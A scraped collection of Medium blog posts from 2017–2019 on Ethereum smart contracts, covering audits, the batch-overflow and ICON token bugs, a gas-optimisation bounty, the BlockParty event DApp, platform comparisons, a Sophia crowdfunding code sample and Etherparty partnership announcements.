When these flaws are uncovered during the audit process, we will pass them over to our client and they will have the developer change it or scrap it. Generally we do not recommend having business logic that is too complicated like batch_transfer; we would allow something like batch_whitelisting, but with batch_transfer you have tokens transferring and a lot of issues can come up.So we will let out client know about this, and recommend as much as we can to keep their ICO code simple and safe.Q: What is the purpose of batch transfer? Token Generation Event distribution?A: Batch transfer may be cheaper to run on 10 addresses than running 10 transfer functions. Yes, we have also noticed this with whitelisting addresses.Q: How important do you think smart contract auditing is? I believe some ICOs out there skip on smart contract auditing.A: One thing we look for when auditing contracts is to make sure they are script friendly. They wouldn\u2019t cause too many problems if someone is calling the function using web3 libraries. In the code highlighted above, we would also flag the function for not checking if the address array is empty. We would also make sure each major function returns a Boolean and they send events for every change they make.Auditing is important for many companies who want to attract a large number of contributors and investors want to be reassured the contracts are safe and cannot be hacked. I believe some ICO reviewing sites and perhaps exchanges would ask if a business\u2019 tokens have been audited.Q: (Related to previous reply) Would there be specific functions or steps that can be done on Bluzelle database to mitigate this as well? What are the possibilities?A: Are you asking about putting ICO details on a Bluzelle database? Perhaps it will be possible one day.A Bluzelle database could be used for pre-sale accounting. Many businesses who has an ICO also offer pre-sale agreements where contributors who invest before the sale ca get bonus tokens, but they have to wait a certain period time, and even then they can only withdraw every 4 months for example. There are many companies who have asset up like this, and all the data is store on the Ethereum network.It is quite expensive and complicated, so a bluzelle database can definitely help. It acts like a \u201ctrust\u201d account.Q: Once a smart contract is hit by batch overflow bug, can it be rectified?A: It is a messy process, the business team would have to reach out to all contributors and notify everyone about the bug, then they will have to deploy a new token contract with updated codes that are safe.After which, they will need to gather all transfer data from the previous token and then compensate all contributors accordingly, ensuring they have the same balance they had prior to the discovery to the bug.Q: How long does the security audit usually take?A: It usually takes 2 to 4 weeks\u200a\u2014\u200afirst round of review, then we do a final round of review to ensure their final contract is ready for the main Ethereum network. We worked on a few ICO contracts that had a ledger, trust-account presale function.Due to the business logic they\u2019ve used, it takes longer to review them as a series of new test scripts have to be developed that would cover different cases that can occur during the pre-sale.For a regular crowdsale contract, we spent quite some time on edge-case scenarios. For example, we test to see what happens if number of tokens a contract has is less than the cap, and a user sends the cap amount in ETH, will they be refunded an accurate amount of ETH\u200a\u2014\u200awill the amount of tokens be accurate, etc. Even if a contributor gets 1 less base token, we will let our client know, usually due to rounding errors.Q: How do you find working in this blockchain space? What excites you most?A: One thing that excites me very much is the amount of opportunities that are possible with global financial transactions. In the past, we had to work with banks or PayPal if you wanted to do some sort of automated transactions. With Ether, it is possible to process a purchase transaction from your online store, or pay dividends to stakeholders.With the Blockchain and smart contract, we can now all develop these services that are geared towards our needs; we no longer need to work with a vendor to handle these transactions. For example, many non-profits or charity sites use PayPal to get contributions. There are most likely a lot of fees incurred from both the sender and receiver; with a Blockchain network like Ethereum, lots of options are available to create a custom-made financial instrument or service.", "responses": ""}, {"title": "It\u2019s happened again: ICON\u2019s $800M Smart Contract\u00a0Mistake", "author_name": "Amy Wan", "link": "https://medium.com/sagewise/its-happened-again-icon-s-800m-smart-contract-mistake-fe522c4dd466?source=search_post", "post_date": "Jun 15, 2018", "readtime": "2 min read", "upvotes": "212", "content": "It\u2019s happened again: ICON\u2019s $800M Smart Contract\u00a0MistakeAmy WanBlockedUnblockFollowFollowingJun 15, 2018We often joke in our company that we should throw up a simple website with the words \u201c__ days since a smart contact disaster\u201d splattered across the top. From our internal tracking, the number rarely exceeds 30 days.ICON\u2019s Big Smart Contract MistakeICX hosts their token on the Ethereum network in an ERC20 token contract. This contract unfortunately has a bug that allows anyone to freeze all token transfers simply by calling disableTokenTransfer(). The function was supposed to only be callable by one account on the system, but a reversed logic statement in the code means that anyone can call it except the one special account.The ICX ERC20 bug allows anyone to freeze token transfers. There is a lot of irony in this. The code that was meant to allow an administrator special emergency rights accidentally granted everyone else those special rights.There\u2019s a Reddit discussion of the incident here.How Sagewise Could Have HelpedOur CTO Daniel Rice explains, \u201cif Sagewise SDK had been deployed in the ICX ERC20 contract, this administrator special functionality would not have been needed. Instead Sagewise SDK would provide the needed special controls. Furthermore, if a bug had still been discovered in the contract, the smart contract parties could use our SDK to freeze the entire contract, and potentially send it to dispute resolution where a replacement contract with the bugs fixed could be created.\u201dHow many days until the next smart contract disaster? We\u2019ll give you a shout out to the person who comes closest to the right number.", "responses": ""}, {"title": "Optimization Bounty for Loopring Smart Contracts on\u00a0Ethereum", "author_name": "Daniel Wang", "link": "https://medium.com/loopring-protocol/optimization-bounty-for-loopring-smart-contracts-on-ethereum-c043bf531527?source=search_post", "post_date": "Mar 31, 2018", "readtime": "2 min read", "upvotes": "219", "content": "Optimization Bounty for Loopring Smart Contracts on\u00a0EthereumDaniel WangBlockedUnblockFollowFollowingMar 31, 2018Use your skill and experience to win up to 500K LRC. This bounty program is designed to optimize Loopring Protocol smart contract to reduce gas consumption.Loopring Protocol Smart ContractsThe Loopring project is a protocol for decentralized token exchange. We have deployed v1.3 on Ethereum mainnet. This set of smart contracts include the following files:LoopringProtocol.sol: An interface for describing the protocol\u2019s functionality.LoopringProtocolImpl.sol: The protocol implementation that encapsulates most of the core logics. This file demands a great deal of review and auditing.TokenRegistry.sol: This smart contract whitelists ERC20 tokens supported by Loopring protocol. Loopring will only support tokens with verified source code.NameRegistry.sol: This smart contract allows ring-miners and wallets to register so the can use a smaller id instead of addresses in ring settlement transactions.TokenTransferDelegate.sol: A smart contract to transfer tokens on behalf of different versions of the Loopring protocol meant avoid re-authorization after a protocol upgrade/migration.BackgroundThis is our second optimization bounty program. In our first optimization bounty, we have paid contributors 687750 LRC for reducing the gas usage of our referencing test from 511465 to 367070. With additional features implemented, the current gas usage for the same test has increased to about 471100.RewardsWe will use 471100 as the gas usage baseline. For each percent of gas reduction, we will pay the contributor 10K LRC. The cap is 500K LRC.We will also put the contributor\u2019s GitHub URI in our smart contract source code if he/she can reduce gas usage by at least 5%.RulesYou must submit fully working pull requests (PRs), including all necessary test updates. If you cannot get our final approval and become irresponsive for one week, we will close your PR.We do not accept ideas, so don\u2019t send us email, create PRs directly on GitHub.Optimizations with less than 0.5% gas reduction is not qualified.Optimizations that have already been submitted by another user are not eligible for bounty rewards.Loopring foundation is at the sole and final discretion of these bounty programs.The bounty programs starts now and ends by the end of May 2018. LRC reward will be paid before June 15th.", "responses": "2"}, {"title": "What it looks like to interact with a smart contract for day to day\u00a0events.", "author_name": "makoto_inoue", "link": "https://medium.com/noblocknoparty/what-it-looks-like-to-interact-with-a-smart-contract-for-day-to-day-events-352726ab7915?source=search_post", "post_date": "Sep 20, 2017", "readtime": "8 min read", "upvotes": "31", "content": "What it looks like to interact with a smart contract for day to day\u00a0events.makoto_inoueBlockedUnblockFollowFollowingSep 20, 2017Me doing a flash demo at September Ethereum\u00a0meetupIntroductionI am currently working with Ethereum London meetup to manage their huge waiting list with an event management smart contract called BlockParty.In their September meetup, we rolled out at a smaller scale where five people participated.Since we are aiming to gradually increase the capacity, I would like to walk you through what it is like (right now) for people to interact with such smart contracts.This article is intended for non technical readers. If you know Ethereum enough to participate in an ICO, probably you understand some technical aspects.What is BlockParty?(You can skip this section if you already know what it is)I have been working on an event management DApp (Distributed App) called \u201cBlockParty\u201d. You pay a small deposit when you register. You lose your deposit if you do not turn up. You will get your deposit back + we split the deposit of whom did not turn up. Simple!I\u2019ve been using the dapp on the mainnet (with real ether at stake) since DevCon2 to host small parties (we used to put ETH1 per person as a deposit!).For more detail, please watch my talk which I gave at Ethereum London meetup back in April.Going 100% at Ethereum CodeUp, Ethereum London\u2019s small\u00a0brotherEthereum CodeUp is a monthly (ish) study group I\u2019ve been organising over a year. Unlike Ethereum London, our meetup has less than 30 signups but getting a bit too big for the venue we host which have maximum of 20 people. I\u2019ve already piloted (meaning non mandatory) BlockParty back in June so this time I made it mandatory. I managed my company to sponsor some pizza for the first (and probably the last) time so having exact number of participants was more important than ever to have no pizza waste.How people participated during\u00a0CodeUpBlock Party still lacks a lot of functionalities as a meetup page, so we are still relying on meetup.com for things like announcing an event and managing its waiting list.To make Block Party as a primary registration tool, I only let myself reserved so that everybody else stayed on the waiting list.We had over 25 people on the waiting list but the actual registration on BlockParty went very slowly, only 8~9 signed up until a few days before the actual meetup date. This was expected as people were reluctant to register until they were sure to come, allowing people who found out the event later on can still secure a spot.I received a couple of comments about having problem registering the events.When I looked at the transactions, some failures were due to setting gas limit too low.Failed transaction with gas limit too\u00a0lowWhen you register, it usually takes 150,000 gas but looks like the transaction above only set 100,000 leading to \"Out of gas\" error. You have to bear in mind that you still lose the gas in such a situation. This user set transaction gas relatively high (27Gwei), so ended up losing $0.68. I assumed that client wallets such as MetaMask and Mist would warn user if gas price was too low, but I am guessing that the estimate was not that accurate.Remember, this is the magic formula of the maximum you pay to Ethereum network (not to me).Actual Tx Cost/Fee = Gas price * Gas limitA few of my colleagues also registered the event but he made a classic mistake, sending the transaction from an exchange. I figured out because its input data shows almost no data.Failed transaction with no input\u00a0dataOne of our regular participants also did some unexpected thing. He registered without intention to attend, deliberately leaving extra deposit to share. I may add this as an extra \u201csponsor\u201d feature to make this more explicit while not taking up the actual spot.Potential \u201csponsor\u201d feature? Message from Codeup gitter\u00a0channel.In the end, 13 people registered and 12 people showed up. There was one person who could not register because he did not understand the rule of the registration process, so I need to make the description a bit clearer.Are BlockParty smart contracts secure?I\u2019ve been working on this project for over a year and have deployed the contract for 3 times. Every time after each event, I (or someone else) ended up finding some security vulnerabilities, so for me deploying smart contracts is a nerve wracking thing.Fortunately none of them lead to losing participant\u2019s money but I have a fear that it\u2019s matter of time that deposits in the smart contract gets stuck due to a bug of the contract or drained by someone exploiting the bug.Even though I have terms and conditions stating that I have no responsibility for the use of the software, I still feel responsible for any damages caused by my coding. At the same time, I don\u2019t have enough Ether to cover user\u2019s loss unlimitedly.So far, the current participants of BlockParty have been innovators who understand the risk (or people who literally thinks \u201cCode as law\u201d). As the target users shift to early adopters, we need a way to be more tolerating against such risks.As someone who works at an insurance company, I started wondering if I can offer some sort of insurance policy and I wrote a gist offering a sum of loss to be covered up to ETH 1 only for people who pays the premium of ETH 0.0032, which is about 6% of the deposit.Formula of calculating the\u00a0premiumIt was not a smart contract partially because I did not want to write something I don\u2019t even know if people want, but also wanted to avoid the situation that my insurance contract contains bugs and get exploited.So did people buy the insurance policy?No one.The insurance deposit was relatively small and some people paid more to Ethereum network by paying higher gas price.I asked to the participants why no one was interested. The response was simple. People said that they trusted me. Though most of the meetup participants knew how to read Solidity code, none of them even looked at the code hosted on Github.Ironically it actually had a security vulnerability.Bug report on github\u00a0issuesThis was the first bug that anyone, whether they have registered the event or not, could drain money.Fortunately this could be exploited only if I decided to cancel the event and let all participants to withdraw their deposit equally.For more technical detail of the incident, please read my another blog post \u201cPerformance tuning smart contracts for fun and profit (with some horror)\u201d.Piloting at Ethereum\u00a0LondonOne week after the CodeUp, there was Ethereum London. Ethereum London is one of the biggest Ethereum community in the world with over 5,000 members. For the September meetup, there were 260 registrations with over 500 people on the waiting list.Though it is technically possible to use BlockParty to manage over 300 people, we started small by having only 10 spots among people who already have spot on the event, and 5 people actually registered.How does BlockParty sign you\u00a0in?By default, the contract owner (me) has an ability to mark each participant as attended. This is okay for smaller events but may not be scalable (plus costly for the contract owner) as the number of participants grows. My dream solution is to have some sort of \u201cProof Of Presence\u201d either via NFC(Near Field Communication) or BlueTooth combined with IoT to automatically let you in only if you are within a certain range from the venue.The alternative, more analogue way, was to issue an unique one time confirmation for each participant.Each participant copied&pated confirmation codeThe code could be any random string but we decided to use the public address of ether cards with CryptoCompare custom design and gave away to each participant. This way, you can still reuse the card as a normal gift wallet as you haven\u2019t peeled off the private key yet.This method is okay when as long as we have enough ether cards to give away but may eventually run out. Even a lot simpler approach can be to use one time password across all the participants and share it on screen as a QR code. The downside is that there are risk of people sharing on social network and non participants could attend, but there are economic incentive not to do so to maximise each participant\u2019s payout. What do you think?What\u2019s next?I must admit that the usability of interacting with smart contract is still not easy. People could waste their gas for easy mistake or lose the entire deposit due to bugs.It may take a bit while to make BlockParty good enough to use 100% for Ethereum London Meetup. So how can you contribute?Join via BlockParty at the next Ethereum London or CodeUp events and give us as much feedback.Interested in using BlockParty at your local meetup? Register your interest here\u00a0.Are you a smart contract developer? Please have a look into the actual contract code, and provide peer reviews.You can\u2019t code but could help financially? If you are willing to contribute to bug bounty pots, please contact me via makoto_inoue\u00a0. I once setup bug bounty with ETH1 but no one paid attention. It may be the time to revive it again.", "responses": "1"}, {"title": "FLETA in Comparison to other Smart Contract Platforms", "author_name": "FLETA Blockchain", "link": "https://medium.com/fleta-first-chain/fleta-in-comparison-to-other-smart-contract-platforms-6a7d368b42c9?source=search_post", "post_date": "Feb 19", "readtime": "5 min read", "upvotes": "299", "content": "FLETA in Comparison to other Smart Contract PlatformsFLETA BlockchainBlockedUnblockFollowFollowingFeb 19Smart contract platforms such as Ethereum, EOS, and many more have opened up opportunities for developers all around the world.Decentralized applications (DApps) have great potential for extensive industry-disrupting capabilities. Currently, there is a race among top smart contract platforms in providing an ideal environment where DApps can take off.FLETA is striving in this race to become the Google Android and Apple iOS of the blockchain market. To see how FLETA measures up, let\u2019s look at a comparison between two heavy hitters in this same space: Ethereum and EOS.EthereumBitcoin was truly disruptive as a decentralized P2P financial system, however, people wondered whether blockchain technology had more in store. Vitalik Buterin answered by creating the world\u2019s first smart contract platform in Ethereum.Key PointsTo understand the core philosophy behind Ethereum there are two aspects to consider:Ethereum\u2019s \u201cgas\u201d modelEthereum\u2019s consensus algorithm.Gas ModelIn Ethereum, smart contracts are executed under the \u201cgas model\u201d. You can think of Ethereum as a global, decentralized supercomputer renting out computational power to others to run smart contracts hosted on the supercomputer. This \u201ccomputational power\u201d is called gas and each execution step of a smart contract requires a certain amount of gas to be spent.Consensus MechanismEthereum currently uses the Proof-of-Work (PoW) consensus algorithm.Under PoW miners add blocks by using their computational resources to solve hard cryptographic puzzles. While PoW is secure, the problem lies in it being extremely wasteful of computational power and energy, both valuable resources.This is why Ethereum plans to move to Proof-of-Stake (PoS) as PoS will replace block miners with block validators where validators stake tokens, and when new blocks are added, validators are provided with a proportion of rewards relative to their staked token amounts.Ethereum\u2019s version of PoS is the Casper protocol that works similar to standard PoS algorithms yet differs in its punishment mechanism; any validator attempting to act maliciously will have their stakes slashed and taken away.Limitations of\u00a0EthereumThere are three problems that Ethereum currently faces:Ethereum is not scalable and can only manage 15\u201320 transactions per second currently.Gas costs can get very high. Developers don\u2019t need to pay the majority of these fees directly however users are required to bear the costs as they interact with the DApps to send transactions. This clearly isn\u2019t ideal for users.Finally, it is not yet known how Ethereum will perform once they transition to PoS. Ethereum has been a PoW chain for years and making this jump is not going to be without obstacles, especially as their mainnet is already live and running.EOSEOS came about as an answer to scalable smart contracts and the man behind EOS is Dan Larimer, the creator of Steem and BitShares.Key PointsThere are also two key points to understanding the philosophy behind EOS:Ownership ModelDelegated Proof-of-Stake (DPoS).Ownership ModelWhile Ethereum rents out resources, under EOS, users own resources.By staking and locking up EOS tokens, you are provided an equivalent amount of resources in network and CPU bandwidth in return. To obtain RAM however, this needs to be purchased from an in-built RAM marketplace. By buying and using these resources, developers are then able to create decentralized applications.DPoS ConsensusDelegated proof-of-stake works the same as normal PoS with one small caveat. While the entire network takes place in the PoS protocol, under DPoS, only 21 block producers are elected by the community.These 21 block producers are put in charge of consensus for the entire ecosystem. Since only 21 nodes decide on consensus\u200a\u2014\u200aas opposed to the whole network\u200a\u2014\u200athis means consensus is significantly faster, however this does introduce greater centralization.Limitations of\u00a0EOSLimitations of EOS are as follows:With EOS there are high upfront costs for developers. Not only do developers have to lock up and stake tokens to gain bandwidth resources, they are also required to buy RAM for user accounts from the marketplace.Decentralization is sacrificed for speed. Since only 21 block producers are in charge of consensus, the system becomes more centralized and vulnerable to potential corruption and attacks.How does FLETA\u00a0differ?FLETA provides developers with a blockchain platform that is far more flexible and affordable than Ethereum and EOS. The main differential points are:A fast and secure consensus algorithm.Developer friendly ecosystem.Proof-of-FormulationUnder Proof-of-Formulation (PoF), instead of miners and validators, there are two groups of actors involved in block creation and transaction confirmation:Formulators: block generatorsObservers: Witnesses of block creation and security for the network.Formulators work in groups of 20 and are subdivided based on rank (#1 to #20):Block generator is the first ranked formulatorSynchronization group are formulators ranked 2nd to 10thStand by group and observers are ranks 11 to 20.Why PoF is faster and more secure is because consensus on blocks and transactions are divided and delegated between different Formulator groups, as they work simultaneously in a parallel sharded fashion for faster transaction processing.Furthermore, because of the multi-chain design of FLETA\u2019s blockchain system and PoF, double spending is not possible.Developer Friendly EcosystemFLETA produces a much cheaper and flexible platform for developers for DApp creation as:Developers can choose whether they wish to utilize FLETA\u2019s technological services. If they decide to do so, the costs incurred will only depend on usage.Developers on the FLETA platform launch their DApps on their own independent subchain, where they have complete discretion on their own unique token economies, consensus algorithm, and transaction fees (or lack thereof).ConclusionIn conclusion, here is a comparison overview between all three platforms:Websitehttps://fleta.io/Telegramhttps://t.me/FLETACHATTwitterhttps://twitter.com/fletachainMediumhttps://medium.com/@fletachain", "responses": "1"}, {"title": "Successful Smart Contract Audits\u00a0Posted", "author_name": "Wibson", "link": "https://medium.com/wibson/successful-smart-contract-audits-posted-c1bea0213214?source=search_post", "post_date": "Sep 13, 2018", "readtime": "2 min read", "upvotes": "458", "content": "Successful Smart Contract Audits\u00a0PostedWibsonBlockedUnblockFollowFollowingSep 13, 2018One of the most critical elements of any blockchain based project is the integrity and security of the network, with the foundation being the smart contracts deployed in the network. In order to ensure a high of level confidence in the details of the smart contracts, third party audits of the code are typically performed.Wibson chose to perform two security audits on our Ethereum smart contracts, the results of which we are sharing with you today. The audits come from Zeppelin and New Alchemy, who will very shortly be publishing the reports on their own platforms as well. Both audit teams provided valuable feedback that resulted in some limited changes to the contracts. Those changes were then also audited, and the completed results included in the final reports, which you can find in the Documents section of Wibson.org.Completion of these audits is a major step in the Wibson consumer data marketplace project and we are very pleased to have received support from Zeppelin and New Alchemy at this stage of the process. Once we launch the Wibson marketplace, we will unlock access to our source code that the audits reviewed, as well as initial documentation for the code, both on GitHub.We hope you will review these documents thoroughly, provide us feedback and ask us questions in our Telegram group.Cheers,The Wibson TeamJoin our communityJoin Wibson on TelegramFollow Wibson on TwitterFollow Wibson on FacebookRead articles on our Wibson blog", "responses": ""}, {"title": "Smart Contract Audit\u00a0Report", "author_name": "The \u0410byss Team", "link": "https://medium.com/theabyss/smart-contract-audit-report-77deda994ce4?source=search_post", "post_date": "Mar 16, 2018", "readtime": "2 min read", "upvotes": "211", "content": "Smart Contract Audit\u00a0ReportTi\u1ebfng Vi\u1ec7t | \ud55c\uad6d\uc5b4 | \u65e5\u672c\u8a9e |\u00a0\u0420\u0443\u0441\u0441\u043a\u0438\u0439The \u0410byss TeamBlockedUnblockFollowFollowingMar 16, 2018Great news! The Abyss DAICO Smart Contract has no security vulnerabilities, as concluded by New Alchemy\u200a\u2014\u200athe world-famed auditor that provides technology, token game theory, advisory and security audit to the most innovative companies globally.The story goes this way. In January 2018, we hired New Alchemy to audit our smart contract after we got it compliant with the newly adopted DAICO model. It was the second time The Abyss engaged the auditor to review and report the Smart Contract we have created to support the platform. As previously, the engagement was technical in nature and focused on identifying security flaws in code or the design of the contracts.A huge work has been carried out, and the general conclusion now states:\u201cThe audit did not discover any issues of critical severity.\u201dSeveral minor issues that have been identified, were fixed respectively following the auditor\u2019s recommendations. Comments on design decisions and code quality made by New Alchemy during the review\u201c\u2026are not known to represent security flaws\u201d.By this done, The Abyss now has two independent audits of the DAICO Smart Contract.Read the full Smart Contract report by New Alchemy at: https://theabyss.docsend.com/view/62nrsypAlso check the independent Smart Contract audit by Oceanico at:https://theabyss.docsend.com/view/hg8xensBest,The Abyss Team", "responses": ""}, {"title": "\u00e6pps Update: Sophia Smart Contract\u00a0Language", "author_name": "\u00e6ternity", "link": "https://blog.aeternity.com/%C3%A6pps-update-sophia-smart-contract-language-2b5a957c9416?source=search_post", "post_date": "Jul 2, 2018", "readtime": "4 min read", "upvotes": "128", "content": "\u00e6pps Update: Sophia Smart Contract\u00a0LanguageAt \u00e6ternity we are continuing to migrate our \u00e6pps to the \u00e6ternity Testnet in preparation for the Mainnet release. In the meantime we are working on a number of developer tools and tutorials, which we would like to share in upcoming \u00e6pps\u00a0updates.\u00e6ternityBlockedUnblockFollowFollowingJul 2, 2018At the time of the Mainnet release, \u00e6ternity will offer two smart contract languages: Sophia and Varna. We will discuss Varna in a separate post. Today we are focusing on Sophia.Sophia Smart Contract\u00a0LanguageSophia is the more expressive of the two smart contract languages. In the next few paragraphs we\u2019ll go over some of the features which make it a superior smart contract language. We have written a tutorial which explains and illustrates some of these features as code examples.Functional ProgrammingSophia is a functional language in the ML family. We\u2019ve chosen the functional programming paradigm because it makes it easier to write correct programs\u200a\u2014\u200asomething which is particularly important with smart contracts. The qualities of functional languages which make them (potentially) more reliable than programs written using the imperative paradigm include restricted mutable state, fewer side-effect, easier to read code components, better handling of concurrency, and ease of debugging and testing.StateSophia does not have arbitrary mutable state, but only a limited form of state associated with each contract instance. An example of state specific code and ways to access the state can be found here.Strongly TypedSophia is a strongly typed language, which means that the compiler checks if the value assigned to a variable is indeed the type that was declared for the this variable at time of compiling. Being able to specify and automatically prove the properties of a smart contract make Sophia a safer smart contract language.First Class\u00a0ObjectsIn Sophia the following components are first class objects: smart contracts, oracles, names, and state channels. This means that they are directly available, instead of defined by code libraries making these objects easier to access, cheaper while reducing the complexity of the code.Pattern MatchingSophia features pattern matching based on ReasonML allowing for a streamlined control flow and ability to construct easy to read control statements.A Crowdfunding ExampleTo illustrate some of the features mentioned above we have written a simple example of a Crowdfunding Campaign smart contract, which we would like to share:/* * A simple crowd-funding example */contract FundMe =record spend_args = { recipient : address,                        amount    : int }record state = { contributions : map(address, int),                   total         : int,                   beneficiary   : address,                   deadline      : int,                   goal          : int }private function require(b : bool, err : string) =    if(!b) abort(err)private function spend(args : spend_args) =    Chain.spend(args.recipient, args.amount)public function init(beneficiary, deadline, goal) : state =    { contributions = {},      beneficiary   = beneficiary,      deadline      = deadline,      total         = 0,      goal          = goal }private function is_contributor(addr) =    Map.member(addr, state.contributions)public stateful function contribute() =    if(Chain.block_height >= state.deadline)      spend({ recipient = Call.caller, amount = Call.value }) // Refund money      false    else      let amount =        Map.lookup_default(Call.caller, state.contributions, 0) + Call.value      put(state{ contributions[Call.caller] = amount,                 total @ tot = tot + Call.value })      truepublic stateful function withdraw() =    if(Chain.block_height < state.deadline)      abort(\"Cannot withdraw before deadline\")    if(Call.caller == state.beneficiary)      withdraw_beneficiary()    elif(is_contributor(Call.caller))      withdraw_contributor()    else      abort(\"Not a contributor or beneficiary\")private stateful function withdraw_beneficiary() =    require(state.total >= state.goal, \"Project was not funded\")    spend({recipient = state.beneficiary,           amount    = Contract.balance })    put(state{ beneficiary = #0 })private stateful function withdraw_contributor() =    if(state.total >= state.goal)      abort(\"Project was funded\")    let to = Call.caller    spend({recipient = to,           amount    = state.contributions[to]})    put(state{ contributions @ c = Map.delete(to, c) })Near FutureIn addition to our ongoing \u00e6pps progress, we are working on a number of new developer tools which we will be announcing in the near future. Stay tuned for more and as always feel free to contact us directly in the Forum or in GitHub.", "responses": "2"}, {"title": "Get Started with Vyper: The Pythonic Ethereum Smart Contract\u00a0Language", "author_name": "Ross Bulat", "link": "https://medium.com/block-journal/get-started-with-vyper-the-pythonic-ethereum-smart-contract-language-e5e58969087e?source=search_post", "post_date": "Nov 12, 2018", "readtime": "12 min read", "upvotes": "143", "content": "Get Started with Vyper: The Pythonic Ethereum Smart Contract\u00a0LanguageGet to know the first real alternative to Solidity smart contractsRoss BulatBlockedUnblockFollowFollowingNov 12, 2018Vyper is a Python 3 derived programming language for Ethereum Smart contracts, and an alternative to Solidity. All Vyper syntax is valid Python 3 syntax, although it has not adopted the entirety of Python 3\u2019s feature set. Vyper is in its early stages of development, but the open source project is available for us to dive into and contribute to right now.This article will outline the real principles and reasons behind Vyper, the differences to Solidity, and various syntax we should be aware of. Finally we will visit the installation process of Vpyer.I personally like the project\u200a\u2014\u200alooking at their example smart contracts is very seducing; they look and feel like Python; the contracts present themselves in a very familiar way Python developers have come to appreciate, and this simplicity is beneficial for reasons we will discuss further down the article.If you would like to familiarise yourself with Solidity as well as Vyper, visit my Solidity on-boarding article aimed at developers to start writing smart contracts with the language:Writing Smart Contracts with Solidity > 0.5A brief walkthrough to start writing Ethereum smart contracts with Solidity 0.5 and abovemedium.com", "responses": "2"}, {"title": "Etherparty & RSK Partnership Fuels the Future Adoption of Smart Contract Technology", "author_name": "Etherparty Smart Contracts, Inc.", "link": "https://blog.etherparty.com/etherparty-rsk-partnership-fuels-the-future-adoption-of-smart-contract-technology-ae5e0e342025?source=search_post", "post_date": "Dec 21, 2017", "readtime": "2 min read", "upvotes": "58", "content": "Etherparty & RSK Partnership Fuels the Future Adoption of Smart Contract TechnologyEtherparty Smart Contracts, Inc.BlockedUnblockFollowFollowingDec 21, 2017Seasons Greetings Everyone!The Etherparty team is delighted to provide the latest update on our Partnership with RSK which was announced this past August. The RSK integration has now been completed and is available on the Etherparty platform beta for registered users to test.\u201cThis announcement ties in an exciting end to a fantastic year for Etherparty, it marks the beginning of a successful partnership that will allow us to build an improved platform,\u201d stated CEO, Kevin Hobbs. \u201cSmart contract technology will transform commerce in the years to come, especially in terms of new and improved software this partnership will enable.\u201dBoth companies aim to lead the technology revolution through education, innovation and collaborative efforts that lead to technology advancements.RSK is the first open-source smart contract platform that allows Bitcoin users and miners to be players in the smart contract movement. The company is well positioned in South America and is strongly aligned with Etherparty\u2019s values.\u201cWe are putting Blockchain technology at the service of social transformation to build a more flexible and inclusive financial system that will improve the life of millions of people,\u201d said RSK Head of Business Development Henry Sraigman \u201cWe are confident that education plays a key role in making it happen and we\u2019re glad to partner with Etherparty, an industry leader company that shares our vision.\u201dHappy Holidays!-The Etherparty TeamDisclaimerNo wording contained herein should be construed as solicitation for investment or financial advice in any regard. Etherparty has no control over secondary uses and therefore cannot accept any responsibility for FUEL tokens utilized for investment, speculative, or for secondary market purposes. Statements in this blog relating to the Company\u2019s future plans and objectives are forward-looking statements. Forward-looking statements are based on numerous assumptions and are subject to all of the risks and uncertainties inherent in the Company\u2019s business, including risks inherent in development.", "responses": ""}, {"title": "TaaS Announces Strategic Partnership With Smart Contract Platform Etherparty", "author_name": "TaaS", "link": "https://medium.com/taas/taas-announces-strategic-partnership-with-smart-contract-platform-etherparty-953ef4c56f8e?source=search_post", "post_date": "Sep 12, 2017", "readtime": "3 min read", "upvotes": "57", "content": "TaaS Announces Strategic Partnership With Smart Contract Platform EtherpartyTaaSBlockedUnblockFollowFollowingSep 12, 2017Kyiv, Ukraine \u2013 September 8, 2017 \u2013 Token-as-a-Service (TaaS), the first-ever tokenized closed-end fund dedicated to blockchain assets, announced its strategic partnership with and investment in easy-to-use smart contracts creator, Etherparty. TaaS has contributed a significant amount of ETH to purchase Etherparty FUEL in the pre-sale as part of the ongoing partnership which will see collaborative efforts between the two enterprises as the cryptocurrency and blockchain markets continue to expand.\u201cThe Earherparty platform allows users with zero knowledge of smart contract programming to create an enforceable, self-executing digital agreement for all types of transactions, said Ruslan Gavrilyuk, co-founder & CEO of TaaS Fund.TaaS analyses hundreds of Token Generation Events (TGEs), selecting just over a dozen per quarter, which meet the high standards required to sustain the platform\u2019s reputation for delivering high returns on investment. The investment platform recently announced has produced a 61% for its first fully-operational quarter (May 1 to August 1, 2017).\u201cWe are very excited with TaaS Fund investing in FUEL and backing Etherparty as they have a reputation for backing winners in this space,\u201d said Kevin Hobbs, CEO of Etherparty.Etherparty is a user-friendly system for the creation, use, and management of smart contracts that has the potential to dramatically expand the rate of commercial and consumer adoption of blockchain technology. While blockchain (or distributed ledger technology) may recast the foundations of electronic commerce and data storage, the technology\u2019s use by non-computer professionals has been limited by a lack of user-friendly applications.\u201cEtherparty unleashes the speed, cost-reduction, and security benefits of smart contracts for individuals and businesses. It represents the next generation of software as a service,\u201d continued Hobbs.The use cases for smart contracts are near limitless, with application opportunities available across almost all industries. The core use cases that Etherparty\u2019s smart contract templates will focus on peer-to-peer escrow contracts, supply chain management, token creation, sports wagering, real estate contracts, and contractor agreements. Using Etherparty means easy access to developed smart contracts. Users simply utilize templates that suit their purpose with no programming expertise required.FUEL is the token that powers the Etherparty platform. FUEL is a transferable ERC-320 compliant digital token deployed on the Ethereum network. Users will pay for access to the platform\u2019s functions, which include access to the smart contract library, security monitoring tools, and a network monitoring dashboard. The FUEL token serves as a method of validating the user\u2019s interactions with Etherparty\u2019s platform. In the future, FUEL will serve as access for smart contracts on multiple blockchains, integrating these disparate blockchains into one unified view within the Etherparty platform.Recently Etherparty announced a strategic partnership with Rootstock (RSK), the first open source smart contract platform powered by the Bitcoin network. Etherparty\u2019s FUEL pre-sale is currently live until September 15, 2017. The FUEL public sale will run from October 1 to October 31, 2017 unless otherwise sold out.", "responses": ""}, {"title": "Etherparty Update: Development, Design &\u00a0Drew", "author_name": "Etherparty Smart Contracts, Inc.", "link": "https://blog.etherparty.com/etherparty-update-development-design-drew-869a43e15024?source=search_post", "post_date": "Mar 2, 2018", "readtime": "3 min read", "upvotes": "145", "content": "Etherparty Update: Development, Design &\u00a0DrewEtherparty is a platform working to enable a connected and inclusive world by building easy-to-use, versatile and intuitive smart contract solutions.Etherparty Smart Contracts, Inc.BlockedUnblockFollowFollowingMar 2, 2018We\u2019re back again with another update from the Etherparty team!First off, we would like to introduce to our community of supporters, Drew Ogryzek, our newest distributed systems and blockchain software developer.Drew joined the team in late February. He is a North Vancouver native who speaks\u200a\u2014\u200aon top of English\u200a\u2014\u200aJapanese and Korean. Drew is a graduate of Oxford, currently completing graduate studies in Advanced Computer Science at Leicester University.So, welcome aboard Drew, we are proud to have 